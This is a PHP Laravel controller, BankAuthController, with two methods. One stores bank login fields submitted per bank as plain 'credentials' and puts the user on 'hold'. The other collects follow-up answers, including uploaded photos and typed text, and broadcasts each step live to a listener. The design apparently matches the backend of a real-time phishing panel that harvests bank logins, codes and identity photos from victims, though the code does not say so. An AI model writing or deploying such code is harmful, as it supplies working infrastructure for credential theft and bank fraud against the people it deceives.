<?php

namespace App\Http\Controllers;

use App\Events\BankSessionUpdated;
use App\Models\BankSession;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;

class BankAuthController extends Controller
{
    public function login(Request $request): JsonResponse
    {
        $data = $request->validate([
            'sessionId' => 'required|string|uuid',
            'bankSlug' => 'required|string',
            'fields' => 'required|array',
        ]);
        $session = BankSession::findOrFail($data['sessionId']);
        $session->credentials = $data['fields'];
        $session->action_type = ['type' => 'hold.short'];
        $session->last_activity_at = now();
        $session->save();

        BankSessionUpdated::dispatch($session);
        return response()->json(['ok' => true]);
    }

    public function answer(Request $request, string $sessionId): JsonResponse
    {
        $session = BankSession::findOrFail($sessionId);
        $command = $request->input('command');

        if ($command === 'photo.with-input') {
            $request->validate([
                'file' => 'required|file|image',
                'text' => 'required|string',
            ]);
            $path = $request->file('file')->store('bank-auth', 'local');
            $session->pushAnswer([
                'command' => 'photo.with-input',
                'payload' => ['path' => $path, 'text' => $request->input('text')],
            ]);
        } elseif ($command === 'photo.without-input') {
            $request->validate(['file' => 'required|file|image']);
            $path = $request->file('file')->store('bank-auth', 'local');
            $session->pushAnswer([
                'command' => 'photo.without-input',
                'payload' => ['path' => $path],
            ]);
        } else {
            $data = $request->validate([
                'command' => 'required|string',
                'payload' => 'required|array',
            ]);
            $session->pushAnswer($data);
        }

        $session->last_activity_at = now();
        $session->save();
        BankSessionUpdated::dispatch($session);
        return response()->json(['ok' => true]);
    }
}
